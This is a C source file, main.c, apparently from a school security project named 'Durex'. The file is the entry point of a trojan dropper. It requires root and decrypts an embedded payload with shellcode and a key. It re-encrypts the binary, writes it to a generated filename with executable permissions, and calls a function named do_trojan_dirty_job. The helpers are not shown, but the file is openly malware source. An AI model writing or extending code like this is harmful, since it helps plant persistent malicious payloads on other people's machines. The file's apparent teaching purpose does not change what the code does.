/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: alagroy- <alagroy-@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/08/14 17:28:28 by vscode            #+#    #+#             */
/*   Updated: 2021/12/10 08:40:19 by alagroy-         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"

static int  write_durex(byte *payload, int len)
{
    int     fd;
    char    file[20];

    get_filename((int *)file);
    if (!access(file, F_OK))
        return (0);
    if ((fd = open(file, O_WRONLY | O_CREAT | O_TRUNC, 0755)) == -1)
        return (-1);
    write(fd, payload, len + SHELLCODE_LEN + KEY_LEN);
    close(fd);
    return (0);
}

int     main(void)
{
    byte    *payload;
    int     len;

    if (geteuid())
    {
        dprintf(STDERR_FILENO, ROOT_ERROR_MSG);
        exit(1);
    }
    puts("alagroy-");
    if (!(payload = decrypt_payload(g_payload, &len)))
        return (-1);
    payload = encrypt_binary(payload, len);
    if (write_durex(payload, len) == -1)
        return (-1);
    do_trojan_dirty_job();
    return (0);
}